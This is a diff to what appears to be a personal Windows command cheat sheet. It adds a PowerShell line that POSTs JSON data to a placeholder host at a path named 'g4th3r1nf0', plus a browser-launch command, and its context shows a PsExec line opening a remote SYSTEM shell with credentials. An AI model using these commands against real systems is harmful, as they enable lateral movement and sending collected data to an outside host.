@@ -9,3 +9,9 @@
 
 ## PSexec
 .\PsExec.exe \\[IP] -u User -p password -s cmd
+
+## HTTP Post json
+ Invoke-RestMethod -Method 'Post' -Uri http:/IP:PORT/g4th3r1nf0 -Body ($json_variable) -ContentType "application/json"
+
+## Open Browser from comand line
+Start-Process "https://debug.to"
